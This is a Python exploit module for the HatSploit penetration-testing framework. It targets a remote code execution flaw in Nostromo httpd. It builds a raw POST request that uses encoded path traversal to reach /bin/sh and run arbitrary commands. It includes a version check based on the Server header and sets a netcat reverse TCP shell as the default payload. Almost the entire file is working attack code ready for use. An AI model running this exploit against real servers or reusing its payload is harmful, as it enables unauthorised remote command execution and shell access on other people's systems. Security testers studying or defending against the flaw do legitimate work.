"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.module.basic import *
from hatsploit.lib.module.proto import HTTP, TCP


class HatSploitModule(Module, Handler, TCP, HTTP):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Category': "exploit",
            'Name': "Nostromo Httpd Remote Code Execution",
            'Module': "exploit/linux/nostromo/remote_code_execution",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
                'sp0re (sp0re) - vulnerability researcher',
            ],
            'Description': "Remote Code Execution in Nostromo Httpd.",
            'Platform': OS_LINUX,
            'Rank': "high",
            'Payload': {
                'Value': "unix/generic/netcat_reverse_tcp",
                'Platforms': [OS_LINUX, OS_UNIX],
            }
        })

    def exploit(self, command):
        payload = ""
        payload += "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n"
        payload += "Content-Length: 1\r\n\r\necho\necho\n"
        payload += f"{command} 2>&1"

        client = self.open_tcp()

        client.connect()
        client.send(payload.encode())

        response = client.recv(4096)
        response = response.decode()

        client.disconnect()
        response = response.split('\r\n\r\n', 1)

        if len(response) == 2:
            return response[1]

    def check(self):
        response = self.http_request(
            method="HEAD",
            path="/"
        )

        if response:
            if 'Server' in response.headers:
                server = response.headers['Server']

                if int(server.split('.')[-1]) < 7:
                    return True

        return False

    def run(self):
        self.module_handle(
            sender=self.exploit,
        )
